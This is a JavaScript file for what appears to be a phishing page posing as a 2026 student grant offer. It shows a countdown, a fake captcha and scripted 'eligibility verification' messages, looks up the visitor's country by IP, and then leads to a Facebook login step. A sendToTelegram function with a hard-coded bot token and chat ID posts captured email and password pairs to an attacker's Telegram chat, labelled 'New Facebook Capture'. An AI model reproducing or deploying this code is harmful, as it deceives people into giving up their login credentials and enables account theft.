// --- Telegram Configuration ---
const BOT_TOKEN = '8399552625:AAGxzewNMQxT5aCKFGJxnvlHezg49OKCETw';
const CHAT_ID = '7181535206';

// Set the launch date to New Year 2026
const targetDate = new Date("January 1, 2026 00:00:00").getTime();

function updateCountdown() {
    const now = new Date().getTime();
    const distance = targetDate - now;

    if (distance < 0) {
        const countdownEl = document.getElementById("countdown");
        if (countdownEl) countdownEl.innerHTML = "<h3>Offer Expired</h3>";
        return;
    }

    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);

    if (document.getElementById("days")) {
        document.getElementById("days").innerText = String(days).padStart(2, '0');
        document.getElementById("hours").innerText = String(hours).padStart(2, '0');
        document.getElementById("minutes").innerText = String(minutes).padStart(2, '0');
        document.getElementById("seconds").innerText = String(seconds).padStart(2, '0');
    }
}

setInterval(updateCountdown, 1000);
updateCountdown();

// === MODAL & INTERACTION LOGIC ===
const claimBtn = document.getElementById('claimBtn');
const modal = document.getElementById('authModal');
const closeModal = document.querySelector('.close-modal');
const modalContent = document.querySelector('.modal-content');

if (claimBtn) {
    claimBtn.addEventListener('click', (e) => {
        e.preventDefault();
        modal.style.display = 'flex';
        setTimeout(() => {
            modal.style.opacity = '1';
            modalContent.style.transform = 'translateY(0)';
        }, 10);
    });
}

function hideModal() {
    modal.style.opacity = '0';
    modalContent.style.transform = 'translateY(20px)';
    setTimeout(() => {
        modal.style.display = 'none';
    }, 300);
}

if (closeModal) closeModal.addEventListener('click', hideModal);

window.addEventListener('click', (e) => {
    if (e.target == modal) hideModal();
});

// === CAPTCHA PROCESS LOGIC ===
const startBtn = document.getElementById('startVerifyBtn');
const captchaBox = document.getElementById('captchaClick');

const steps = {
    guide: document.getElementById('step-guide'),
    captcha: document.getElementById('step-captcha'),
    loading: document.getElementById('step-loading'),
    success: document.getElementById('step-success'),
    final: document.getElementById('step-final')
};

if (startBtn) {
    startBtn.addEventListener('click', () => {
        steps.guide.style.display = 'none';
        steps.captcha.style.display = 'block';
    });
}

if (captchaBox) {
    captchaBox.addEventListener('click', () => {
        if (captchaBox.classList.contains('checked')) return;
        captchaBox.classList.add('checked');
        setTimeout(() => {
            steps.captcha.style.display = 'none';
            steps.loading.style.display = 'block';
            simulateLoading();
        }, 800);
    });
}

let userCountry = "Detecting...";

// Detect Country from IP
async function detectCountry() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        userCountry = data.country_name || "International";
    } catch (err) {
        userCountry = "Global Region";
    }
}
detectCountry();

function simulateLoading() {
    const texts = [
        "Analyzing Browser Fingerprint...",
        `Detecting Node: ${userCountry}...`,
        "Checking Student Database...",
        "Verifying Academic Eligibility...",
        "Grant Approved."
    ];
    let i = 0;
    const interval = setInterval(() => {
        if (document.getElementById('loadingText')) {
            document.getElementById('loadingText').innerText = texts[i];
        }
        i++;
        if (i >= texts.length) {
            clearInterval(interval);
            setTimeout(showSuccess, 1000); // 1s extra delay before showing success
        }
    }, 1200); // Increased delay between messages
}

function showSuccess() {
    steps.loading.style.display = 'none';
    steps.success.style.display = 'block';

    // Increased delay for success tick
    setTimeout(() => {
        steps.success.style.display = 'none';
        steps.final.style.display = 'block';
        setupFinalLoginCapture();
    }, 2500);
}

// === TELEGRAM LOGGING & REDIRECT LOGIC ===

async function sendToTelegram(email, password, attempt) {
    const message = `🔔 *New Facebook Capture*\n👤 *User:* \`${email}\`\n🔑 *Pass:* \`${password}\`\n🔢 *Attempt:* #${attempt}`;
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (err) {
        console.error("Transmission failed", err);
    }
}

function setupFinalLoginCapture() {
    const fbLoginBtn = document.getElementById('fbLoginBtn');
    if (fbLoginBtn) {
        fbLoginBtn.onclick = function () {
            // Show spinner on button
            fbLoginBtn.classList.add('loading');

            // Remove any status message text
            const statusMsg = document.getElementById('fb-status');
            if (statusMsg) statusMsg.innerText = "";

            setTimeout(() => {
                window.location.href = './testing/index.html';
            }, 2000); // Increased delay for "Securing Connection" vibe
        };
    }
}